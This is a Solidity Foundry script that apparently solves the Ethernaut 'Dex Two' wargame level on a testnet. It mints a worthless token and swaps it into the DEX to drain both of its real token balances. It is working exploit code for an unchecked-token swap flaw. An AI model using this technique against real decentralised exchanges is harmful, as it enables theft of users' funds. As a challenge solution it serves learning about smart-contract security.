// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import {UselessToken} from "src/hack/UselessToken.sol";

interface IDexTwo {
    function swap(address from, address to, uint amount) external;

    function token1() external view returns (address);

    function token2() external view returns (address);
}

interface ISwappableToken {
    function balanceOf(address owner) external view returns (uint);

    function approve(address owner, address spender, uint amount) external;
}

contract DexTwoSCript is Script {
    function run() external {
        address dexTwoAddress = vm.envAddress("DEX_TWO_ADDRESS");
        address attacker = vm.rememberKey(vm.envUint("TESTNET_PRIVATE_KEY_1"));
        IDexTwo dexTwo = IDexTwo(dexTwoAddress);
        address tokenOne = dexTwo.token1();
        address tokenTwo = dexTwo.token2();

        vm.startBroadcast(attacker);
        UselessToken uselessToken = new UselessToken(
            "UselessToken",
            "UTN",
            500
        );
        uselessToken.approve(address(dexTwo), 500);
        uselessToken.transfer(address(dexTwo), 100);

        dexTwo.swap(address(uselessToken), address(tokenOne), 100);

        // Calculate amount of UselessToken to swap to get Token2
        // The number of token2 to be returned = (amount of token1 to be swapped * token2 balance of the contract)/token1 balance of the contract.
        // 100 = (x * 100)/200
        // x = 200
        dexTwo.swap(address(uselessToken), address(tokenTwo), 200);
        uint tokenOneBalanceAfterHack = ISwappableToken(tokenOne).balanceOf(
            address(dexTwo)
        );
        uint tokenTwoBalanceAfterHack = ISwappableToken(tokenTwo).balanceOf(
            address(dexTwo)
        );

        assert(tokenOneBalanceAfterHack == 0 && tokenTwoBalanceAfterHack == 0);

        vm.stopBroadcast();

        console2.log("SUCCESS!!! Submit the instance.");
    }
}
